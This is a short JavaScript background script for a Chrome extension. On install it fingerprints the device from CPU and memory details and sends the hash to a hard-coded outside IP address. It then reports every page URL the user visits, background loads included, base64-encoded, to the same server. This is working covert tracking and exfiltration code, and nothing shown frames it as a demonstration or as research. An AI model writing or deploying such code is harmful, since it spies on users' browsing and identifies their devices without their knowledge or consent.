var uniqueId;
var destination = "http://192.88.99.24:8080/"

// This will execute when navigation to a page is completed, even for background loads
chrome.webNavigation.onCompleted.addListener((details) => {
    var url = details.url;
    var opts = {
        'method':'GET',
        'mode':'no-cors'
      }
    fetch(destination.concat(btoa("id=" + uniqueId + ",url=" + url)), opts);
});

// This will execute when the extension is first installed
chrome.runtime.onInstalled.addListener(() => {
    // var uniqueId;
    var opts = {
        'method':'GET',
        'mode':'no-cors'
    }
    chrome.system.cpu.getInfo((cpuInfo) => {
        chrome.system.memory.getInfo((memoryInfo) => {
            var info = "timestamp=" + Date.now() + ",archName=" + cpuInfo.archName + ",modelName=" + cpuInfo.modelName + ",numOfProcessors=" + cpuInfo.numOfProcessors;
            info += ",availableCapacity=" + memoryInfo.availableCapacity + ",capacity=" + memoryInfo.capacity;

            // Hash code adapted from https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/digest#converting_a_digest_to_a_hex_string
            const encoder = new TextEncoder();
            const data = encoder.encode(info);
            crypto.subtle.digest('SHA-256', data).then((digestBuffer) => {
                const hashArray = Array.from(new Uint8Array(digestBuffer)); 
                const hashHex = hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
                uniqueId = hashHex;
                fetch(destination.concat(btoa("id=" + hashHex + "," + info)), opts);
            });
        });
    });
});